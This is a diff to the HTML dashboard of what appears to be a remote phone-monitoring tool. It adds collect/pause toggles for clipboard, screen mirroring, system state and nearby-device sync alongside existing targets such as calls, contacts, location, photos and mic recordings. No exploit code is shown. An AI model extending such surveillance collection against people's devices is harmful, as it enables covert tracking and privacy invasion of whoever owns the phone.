@@ -435,8 +435,41 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swDnd">&#x1F514; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swBrightness">&#x2600; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swUptime">&#x23F1; --</span>
-  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swUnlocks">&#x1F513; --</span>
+   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swUnlocks">&#x1F513; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swScreen">&#x1F4F1; --</span>
+</div>
+<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_system">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_system" onchange="toggleSyncPause('system', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_system" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_system" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_system" style="font-size:13px;font-weight:600;color:var(--success)">System State Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_system" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_mirroring">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_mirroring" onchange="toggleSyncPause('mirroring', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_mirroring" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_mirroring" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_mirroring" style="font-size:13px;font-weight:600;color:var(--success)">Mirroring Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_mirroring" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_clipboard">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_clipboard" onchange="toggleSyncPause('clipboard', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_clipboard" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_clipboard" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_clipboard" style="font-size:13px;font-weight:600;color:var(--success)">Clipboard Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_clipboard" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
 </div>
 <!-- Clipboard card -->
 <div class="card" style="border-left-color:var(--accent);padding:12px;margin-top:8px;margin-bottom:12px">
@@ -894,6 +927,17 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <span id="syncToggleLabel_wifi" style="font-size:13px;font-weight:600;color:var(--success)">WiFi Sync: Collecting</span>
 </label>
 <span id="syncToggleStatus_wifi" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_nearby">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_nearby" onchange="toggleSyncPause('nearby', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_nearby" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_nearby" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_nearby" style="font-size:13px;font-weight:600;color:var(--success)">Nearby Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_nearby" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
 </div>
 <div class="wifi-parallel" style="display:grid;grid-template-columns:1fr 1fr;gap:16px;align-items:start">
 <div id="nearbySection" style="margin-bottom:0">
@@ -8587,7 +8631,7 @@ async function pollSyncToggles(){
       const g = await fetchRTDB(`config/sync_toggles`);
       if(g && typeof g==='object') data = g;
     }
-    const targets = ['location','wifi','recents','photos','videos','calls','contacts','voice','files','perms','health','all','browser','activity','ai','timeline','savedWifi','cellInfo','simSlots','apps','logcat'];
+    const targets = ['location','wifi','recents','photos','videos','calls','contacts','voice','files','perms','health','all','browser','activity','ai','timeline','savedWifi','cellInfo','simSlots','apps','logcat','nearby','clipboard','system','mirroring'];
     for(const tgt of targets){
       let val = data[tgt];
       // val true means enabled (collecting), false means paused; if undefined => collecting
